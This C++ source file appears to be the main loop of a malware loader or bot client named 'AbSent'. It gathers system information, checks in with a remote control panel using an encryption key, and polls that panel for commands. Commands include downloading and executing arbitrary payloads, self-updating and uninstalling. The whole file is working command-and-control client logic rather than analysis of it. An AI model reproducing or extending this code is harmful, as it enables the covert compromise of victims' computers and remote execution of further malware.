#include "stdafx.h"

#include <iostream>
#include <string>
#include <list>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <chrono>
#include <thread>

#include "AbSent\json.h"
#include "AbSent\config.h"
#include "AbSent\info\info.h"
#include "AbSent\comm\http.h"
#include "AbSent\tasks\downloadExec.h"
#include "AbSent\tasks\uninstall.h"
#include "AbSent\tasks\update.h"
#include "AbSent\tasks\startup.h"
#include "AbSent\comm\panel.h"


int main()
{
	absent::config::config config = absent::config::load();
	absent::info::info info(config.programNeedles);

	std::cout << "Build Settings: " << config.panelURL << config.gatePATH << std::endl;

	nlohmann::json response = absent::panel::firstKnock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey);
	while (true)
	{
		if (response["task"] != "N/A")
		{
			if (response["task"] == "Download & Execute") 
			{ 
				bool success = absent::tasks::download_execute(response["taskParm"]);
				if (success) { absent::panel::knock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey, response["taskId"], false); }
				else { absent::panel::knock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey, response["taskId"], true); }
			}
			if (response["task"] == "Update")
			{
				bool success = absent::tasks::update(response["taskParm"]);
				if (success) { absent::panel::knock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey, response["taskId"], false); ExitProcess(0); }
				else { absent::panel::knock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey, response["taskId"], true); }
			}
			if (response["task"] == "Uninstall")
			{
				bool success = absent::tasks::uninstall();
				if (success) { absent::panel::knock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey, response["taskId"], false); ExitProcess(0); }
				else { absent::panel::knock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey, response["taskId"], true); }
			}
		}
		std::this_thread::sleep_for(std::chrono::seconds(config.reportInt));
		response = absent::panel::knock(config.panelURL, config.gatePATH, info.getJson(config.buildNAME, config.type, config.versionID), config.encryptionKey, "N/A", false);
	}

	return 0;
}